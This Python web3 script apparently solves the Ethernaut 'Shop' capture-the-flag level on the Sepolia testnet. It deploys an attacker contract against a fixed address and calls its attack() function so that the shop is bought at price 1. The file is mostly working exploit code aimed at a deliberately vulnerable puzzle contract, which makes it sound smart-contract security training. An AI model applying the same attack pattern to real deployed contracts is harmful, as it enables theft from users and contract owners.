import os

import solcx
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to the provider!")
else:
    print("Failed to connect to the given provider ", os.getenv('PROVIDER_URL'))
    exit()

# Load environment variables
_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
_WALLET = w3.to_checksum_address(os.getenv('WALLET'))


def send_transaction_and_wait(transaction):
    transaction = transaction.build_transaction({
        'from': _WALLET,
        'chainId': 11155111,
        'nonce': w3.eth.get_transaction_count(w3.to_checksum_address(_WALLET))
    })
    signed_tx = w3.eth.account.sign_transaction(transaction, private_key=_PRIVATE_KEY)

    txn_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
    assert tx_receipt['status'] == 1
    print(f'Completed transaction: {tx_receipt}')
    return tx_receipt


def compile_contract(contract_path: str, version: str, contract_name: str = None):
    solcx.set_solc_version(version=version)
    with open(contract_path, 'r') as file:
        contract_source = file.read()

    compiled_sol = solcx.compile_source(contract_source)
    if contract_name is None:
        contract_key = next(iter(compiled_sol))
    else:
        contract_key = f'<stdin>:{contract_name}'
    contract_interface = compiled_sol[contract_key]
    print(f'Compiled {contract_path} for contract {contract_key}')
    return contract_interface

deployed_address = w3.to_checksum_address("0x0b79642cb86D3F06a40FB4Bf1D5188Df8B2e7c4D")
compiled_contract = compile_contract("./Shop.sol", '0.8.0', "Shop")
shop_contract = w3.eth.contract(address=deployed_address, abi=compiled_contract['abi'])
assert not shop_contract.functions.isSold().call()

# Step 1: Deploy our own attacker contract
compiled_contract = compile_contract("./Attacker.sol", '0.8.0', "Attacker")
my_contract = w3.eth.contract(abi=compiled_contract['abi'], bytecode=compiled_contract["bin"])
tx_hash = send_transaction_and_wait(my_contract.constructor(deployed_address))
my_contract = w3.eth.contract(address=tx_hash["contractAddress"], abi=compiled_contract['abi'])
print('Attacker contract deployed at', tx_hash["contractAddress"])

# Step 2: call its attack() to shop.buy()
tx_hash = send_transaction_and_wait(my_contract.functions.attack())
assert shop_contract.functions.isSold().call()
assert shop_contract.functions.price().call() == 1
print('Well done, You have completed this level!!!')
